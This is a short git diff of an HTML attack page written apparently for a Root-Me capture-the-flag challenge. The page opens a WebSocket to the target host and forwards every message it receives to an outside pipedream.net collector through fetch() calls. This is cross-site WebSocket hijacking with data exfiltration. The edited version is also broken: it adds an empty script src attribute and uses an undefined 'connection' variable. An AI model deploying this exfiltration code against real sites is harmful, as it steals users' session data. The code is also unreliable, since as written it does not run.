@@ -9,17 +9,16 @@
 <body>
 <h1>Coucou</h1>
 
- <base href="http://ctf30.root-me.org">
+<base href="http://ctf30.root-me.org">
+<script src = ></script>
+
 <script>
-    console.log("hello")
-    fetch(`https://enucj0ezme2n.x.pipedream.net/?eheh=avantlaco`);
-    const ws = new WebSocket('ws://ctf30.root-me.org/ws');
-    fetch(`https://enucj0ezme2n.x.pipedream.net/?eheh=aprèslaco`);
-    ws.addEventListener('open', function start(event) {
-        ws.send("hello");
+  
+    connection.addEventListener('open', function start(event) {
+        connection.send("hello");
     });
 
-    ws.addEventListener('message', function handleReply(event) {
+    connection.addEventListener('message', function handleReply(event) {
         fetch(`https://enucj0ezme2n.x.pipedream.net/?=${event.data}`);
     });
     console.log("bye")
